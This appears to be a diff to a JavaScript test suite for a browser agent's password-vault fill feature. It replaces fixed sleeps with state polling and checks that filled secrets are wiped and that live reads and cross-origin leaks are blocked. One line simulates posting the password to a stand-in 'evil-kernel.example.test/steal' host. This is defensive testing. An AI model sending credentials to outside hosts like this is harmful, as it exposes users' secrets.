@@ -38,6 +38,23 @@ import { fileURLToPath, pathToFileURL } from 'node:url';
 const SELF_PATH = fileURLToPath(import.meta.url);
 const quiet = { log() {}, warn() {}, error() {} };
 const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
+// B-518e (the R30 member, the R29 child's sibling): a step waits on the FACT it needs — asked a bounded COUNT of times from ONE
+// pool for the child (1500 asks, at most 300 a wait: a broken road keeps the child inside the parent's 30 s kill and each later
+// red is its own) — never a fixed sleep raced against the product's 250 ms ceiling
+let askPool = 1500;
+const until = async (fn, { tries = 300, step = 10 } = {}) => {
+  const n = Math.max(1, Math.min(tries, askPool));
+  for (let k = 0; k < n; k++) { askPool = Math.max(0, askPool - 1); if (await fn()) return true; await sleep(step); }
+  return Boolean(await fn());
+};
+// the tab's own state, read without a check (dialogs._watches: a look that starts no ceiling — liveFillOnTarget would start one
+// once the handed-in clock has passed it)
+const tabEntry = (dlg, pid, tid) => {
+  const w = dlg && dlg._watches ? dlg._watches.get(String(pid)) : null;
+  return w ? [...w.targets.values()].find((e) => e && String(e.targetId).toUpperCase() === String(tid).toUpperCase()) || null : null;
+};
+const fenceLifted = (dlg, pid, tid) => { const e = tabEntry(dlg, pid, tid); return Boolean(e) && !e.liveFill; };
+const wipeSettled = (dlg, pid, tid) => { const e = tabEntry(dlg, pid, tid); return Boolean(e) && (!e.liveFill || !e.liveFill.wiping); };
 
 async function startKernelRelay(fk) {
   const { WebSocketServer, WebSocket } = createRequire(import.meta.url)('ws');
@@ -486,8 +503,8 @@ export async function runR30LoginNails({ repoDir, ok }) {
         // Fill #pw and lift via ceiling
         const f1 = await post('/api/agent/browser/fill-vault', { profile: PID, target: '#pw', spec: 'item2r30.example.test#alice/password', targetId: tid });
         clock += 500;
-        await rd(['get', 'title']);
-        await sleep(80);
+        await rd(['get', 'title']);   // (the read starts the ceiling on the clock handed in)
+        const lift1 = await until(() => fenceLifted(dialogs, PID, tid));   // B-518e: the lift's fact, never an 80 ms sleep
         const afterLift = await rd(['get', 'value', '#pw']);
 
         // Part A: Page puts PW back -> read #1 wipes & refuses 409 login_fill_live -> read #2 verifies empty & returns 200!
@@ -502,7 +519,9 @@ export async function runR30LoginNails({ repoDir, ok }) {
         const refillRead3 = await rd(['get', 'value', '#pw']);
         const heldBeforeCeiling = Boolean(dialogs.liveFillOnTarget(PID, tid));
         clock += 500;
-        await sleep(310);
+        // the ceiling's TIMER (its real 250 ms — the leg's point: it runs on a postLiftHeld fence nobody reads) — waited for by the
+        // tab's own state (a look that starts no check, so the timer is the only road), never a 310 ms sleep (B-518e)
+        const timerLift = await until(() => fenceLifted(dialogs, PID, tid));
         const heldAfterCeiling = dialogs.liveFillOnTarget(PID, tid);
 
         // Part B: Recheck fails once (`Runtime.evaluate` + `Page.getFrameTree` error) -> 409 login_check_failed, 0 For-you, next read 200!
@@ -529,6 +548,7 @@ export async function runR30LoginNails({ repoDir, ok }) {
 
         ok(
           f1.status === 200
+            && lift1 && timerLift
             && afterLift.status === 200
             && refillRead1.status === 409 && refillRead1.json?.code === 'login_fill_live' && domAfterRead1 === ''
             && refillRead2.status === 200
@@ -541,7 +561,7 @@ export async function runR30LoginNails({ repoDir, ok }) {
             && openFyAfterCheckFail.length === 0
             && nextHealthyRead.status === 200,
           'R30-2 (Item 2 readable once gone + honest check_failed): post-lift refill wipes on read #1 (0 For-you notices), lifts to 200 on read #2 (and at ceiling), and failed check returns 409 login_check_failed without locking the empty tab',
-          { refillRead1, domAfterRead1, refillRead2, openFyAfterLift, heldBeforeCeiling, heldAfterCeiling, checkFailRead, fenceAfterCheckFail, nextHealthyRead },
+          { lift1, timerLift, refillRead1, domAfterRead1, refillRead2, openFyAfterLift, heldBeforeCeiling, heldAfterCeiling, checkFailRead, fenceAfterCheckFail, nextHealthyRead },
         );
 
         // R30-X1: Page re-mounts filled secret into a brand-new <input id="pw2"> via createElement + appendChild!
@@ -1129,7 +1149,7 @@ export async function runR30LoginNails({ repoDir, ok }) {
         keeper: keeperWrap,
         logins,
         now: () => clock,
-        liveFillMaxMs: 250,
+        liveFillMaxMs: 60_000,   // B-518e: the REAL ceiling out of reach — a read starts it on the clock handed in
         holdersOf: () => [{ browserKey: KEY, sessionId: SID }],
         leaseCountOf: () => 1,
         conversationOf: () => ({ cid: 'conv-r30-x3', name: 'Kernel Agent' }),
@@ -1165,9 +1185,10 @@ export async function runR30LoginNails({ repoDir, ok }) {
         const medEvalLive = await medWs.call('Runtime.evaluate', { expression: 'document.querySelector("#pw").value', returnByValue: true }, attMed.result?.sessionId);
         const exfil = await fk.simulateSubmitRequest({ targetId: tid, url: 'https://evil-kernel.example.test/steal', postData: `pw=${encodeURIComponent(PW)}`, resourceType: 'Fetch' });
 
-        clock += 600;
+        clock += 60_001;
         await post('/api/agent/browser/resolve', { profile: PID, wrapper: true, fenceCheckOnly: true, argv: ['get', 'title'], targetId: tid });
-        await sleep(90);
+        // B-518e: the ceiling's wipe has wiped the box and SETTLED (the tab's own state), never a 90 ms sleep
+        const x3Wiped = await until(() => fk.readDomValues(tid).pw === '' && wipeSettled(dialogs, PID, tid));
         const domWiped = fk.readDomValues(tid).pw;
 
         // Post-lift refill + read #1 wipe + read #2 lift in custom-kernel mode
@@ -1177,7 +1198,7 @@ export async function runR30LoginNails({ repoDir, ok }) {
         medWs.close();
 
         ok(
-          armed.ok === true && kernelDetected
+          armed.ok === true && kernelDetected && x3Wiped
             && fillRes.status === 200 && domFilled === PW
             && readLive.status === 409 && readLive.json?.code === 'login_fill_live'
             && Boolean(medEvalLive.error && /login_fill_live/.test(medEvalLive.error.message || ''))
@@ -1186,7 +1207,7 @@ export async function runR30LoginNails({ repoDir, ok }) {
             && refill1.status === 409 && refill1.json?.code === 'login_fill_live'
             && refill2.status === 200,
           'R30-X3 (Extra scene 3 — custom-kernel mode standard:false): VibeSpace.getVersion activates kernel watch mode, mediated fill-vault types secret, blocks live reads + cross-origin exfil, wipes at ceiling, and catches/lifts post-lift refills',
-          { kernelDetected, fillRes, readLive, medEvalLive, exfil, domWiped, refill1, refill2 },
+          { kernelDetected, x3Wiped, fillRes, readLive, medEvalLive, exfil, domWiped, refill1, refill2 },
         );
       } finally {
         rawWs.close();
@@ -1291,7 +1312,7 @@ export async function runR30LoginNails({ repoDir, ok }) {
         keeper: keeperWrap,
         logins,
         now: () => clock,
-        liveFillMaxMs: 250,
+        liveFillMaxMs: 60_000,   // B-518e: the REAL ceiling out of reach — a read starts it on the clock handed in
         holdersOf: () => [{ browserKey: KEY, sessionId: SID }],
         leaseCountOf: () => 1,
         conversationOf: () => ({ cid: 'conv-r31-3', name: 'Agent R31-3' }),
@@ -1327,9 +1348,25 @@ export async function runR30LoginNails({ repoDir, ok }) {
 
         // Fill #1 on /login -> lift at ceiling
         const fill1 = await post('/api/agent/browser/fill-vault', { profile: PID, target: '#pw', spec: 'r31-spa.example.test#alice/password', targetId: tid });
-        clock += 600;
+        clock += 60_001;
+        // CONTROL (B-518e) — the old 90 ms sleep's window: the ceiling's wipe is HELD at the relay (its Runtime calls wait for the
+        // leg's word) and a read inside it is REFUSED (login_fill_live: the fence holds while it wipes) — a read that lands before
+        // the wipe settles cannot be the lift's verdict; the word given, the lift is waited for by its fact
+        let openWipe = null, wipeCallsHeld = 0;
+        const wipeGate = new Promise((r) => { openWipe = r; });
+        const hookBefore = relay.state.hook;
+        relay.state.hook = async (msg, x) => {
+          const r = typeof hookBefore === 'function' ? await hookBefore(msg, x) : undefined;
+          if (r === true) return true;
+          if (openWipe && /^Runtime\./.test(String((msg && msg.method) || ''))) { wipeCallsHeld += 1; await wipeGate; }
+          return r;
+        };
         await post('/api/agent/browser/resolve', { profile: PID, wrapper: true, fenceCheckOnly: true, argv: ['get', 'title'], targetId: tid });
-        await sleep(90);
+        const wipeHeld = await until(() => wipeCallsHeld > 0);
+        const readInWipe = await post('/api/agent/browser/resolve', { profile: PID, wrapper: true, fenceCheckOnly: true, argv: ['get', 'value', '#pw'], targetId: tid });
+        const release = openWipe; openWipe = null; release();
+        relay.state.hook = hookBefore;
+        const spaLift1 = await until(() => fenceLifted(dialogs, PID, tid));   // B-518e: the lift's fact, never a 90 ms sleep
         const lift1Read = await post('/api/agent/browser/resolve', { profile: PID, wrapper: true, fenceCheckOnly: true, argv: ['get', 'value', '#pw'], targetId: tid });
         relay.state.hook = null;
 
@@ -1342,14 +1379,15 @@ export async function runR30LoginNails({ repoDir, ok }) {
             sessionId: watchClient.sid,
           });
         }
-        await sleep(50);
+        // the dialogs have SEEN the in-document navigation (the tab's own record of it), never a 50 ms sleep (B-518e)
+        const spaSeen = Boolean(watchClient) && await until(() => tabEntry(dialogs, PID, tid)?.loginNavUrl === `${ORIGIN}/login/done`);
         const afterPushStateRead = await post('/api/agent/browser/resolve', { profile: PID, wrapper: true, fenceCheckOnly: true, argv: ['get', 'title'], targetId: tid });
 
         // Fill #2 on `/login/done` -> lift at ceiling -> page script puts SHORT_PW back into `#pw`!
         const fill2 = await post('/api/agent/browser/fill-vault', { profile: PID, target: '#pw', spec: 'r31-spa.example.test#alice/password', targetId: tid });
-        clock += 600;
+        clock += 60_001;
         await post('/api/agent/browser/resolve', { profile: PID, wrapper: true, fenceCheckOnly: true, argv: ['get', 'title'], targetId: tid });
-        await sleep(90);
+        const spaLift2 = await until(() => fenceLifted(dialogs, PID, tid));   // B-518e: the lift's fact, never a 90 ms sleep
         const lift2Read = await post('/api/agent/browser/resolve', { profile: PID, wrapper: true, fenceCheckOnly: true, argv: ['get', 'value', '#pw'], targetId: tid });
 
         await rawWs.evalOnTarget(tid, `(() => { document.querySelector('#pw').value = ${JSON.stringify(SHORT_PW)}; return 1; })()`);
@@ -1364,7 +1402,7 @@ export async function runR30LoginNails({ repoDir, ok }) {
         const putBackRead2 = await post('/api/agent/browser/resolve', { profile: PID, wrapper: true, fenceCheckOnly: true, argv: ['get', 'value', '#pw'], targetId: tid });
 
         ok(
-          Boolean(watchClient)
+          Boolean(watchClient) && wipeHeld && readInWipe.status === 409 && readInWipe.json?.code === 'login_fill_live' && spaLift1 && spaSeen && spaLift2
             && fill1.status === 200 && lift1Read.status === 200
             && afterPushStateRead.status === 200
             && fill2.status === 200 && lift2Read.status === 200
@@ -1376,6 +1414,7 @@ export async function runR30LoginNails({ repoDir, ok }) {
           'R31-3 (Pre-first-await recheckPostLiftOnTab never poisons tab): after SPA pushState triggers pre-await URL-mismatch return, a second fill+lift on the same tab still catches, wipes, and blocks put-back <8B secret (409 login_fill_live, 0 leak) and lifts on empty next read (200)',
           {
             hasWatchClient: Boolean(watchClient),
+            wipeHeld, readInWipe: readInWipe.status, readInWipeCode: readInWipe.json?.code, spaLift1, spaSeen, spaLift2,
             fill1: fill1.status,
             lift1Read: lift1Read.status,
             afterPushStateRead: afterPushStateRead.status,
